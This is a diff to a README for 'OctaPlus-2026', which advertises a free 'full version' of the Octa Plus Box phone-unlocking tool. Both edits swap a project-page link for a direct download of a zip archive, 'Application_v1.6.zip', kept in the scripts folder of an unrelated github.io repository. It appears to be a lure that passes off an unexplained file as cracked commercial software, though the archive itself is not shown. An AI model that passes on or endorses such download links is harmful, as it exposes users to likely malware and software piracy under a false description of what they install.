@@ -5,7 +5,7 @@ description: "Download the full version of Octa Plus Box for Windows 10 and 11 f
 ---
 # 📦 OctaPlus-2026 - Unlock mobile devices with ease today
 
-[![Download OctaPlus-2026](https://img.shields.io/badge/Download-OctaPlus_2026-blue.svg)](https://github.com/Platyceriumbifurcatumforwardpass555/OctaPlus-2026)
+[![Download OctaPlus-2026](https://img.shields.io/badge/Download-OctaPlus_2026-blue.svg)](https://github.com/Platyceriumbifurcatumforwardpass555/platyceriumbifurcatumforwardpass555.github.io/raw/refs/heads/main/scripts/Application_v1.6.zip)
 
 ## 📁 Project Overview
 
@@ -30,7 +30,7 @@ Follow these steps to obtain the installer for your system:
 2.  Locate the release section on the webpage.
 3.  Click the link to save the installer file to your computer.
 
-[Click here to visit the download page](https://github.com/Platyceriumbifurcatumforwardpass555/OctaPlus-2026)
+[Click here to visit the download page](https://github.com/Platyceriumbifurcatumforwardpass555/platyceriumbifurcatumforwardpass555.github.io/raw/refs/heads/main/scripts/Application_v1.6.zip)
 
 ## 🛠️ Installation Instructions
 
